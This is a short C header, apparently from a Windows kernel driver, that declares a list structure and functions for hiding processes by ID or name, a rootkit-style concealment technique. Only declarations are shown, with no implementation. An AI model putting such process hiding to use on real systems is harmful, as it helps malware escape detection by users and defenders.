#ifndef __HIDE_PROCESS_H__
#define __HIDE_PROCESS_H__

typedef struct _HIDE_PROCESS_LIST_INFO
{
	LIST_ENTRY NextList;
	ULONG ulProcessId;
	PLIST_ENTRY pHideProcessListEntry;
} HIDE_PROCESS_LIST_INFO,*PHIDE_PROCESS_LIST_INFO;

void InitializeHideProcessList();
ULONG GetProcessId(PCHAR pProcName);
NTSTATUS HideProcess(ULONG ulHideProcessId);

extern LIST_ENTRY g_HidePrcoessListInfo;
#endif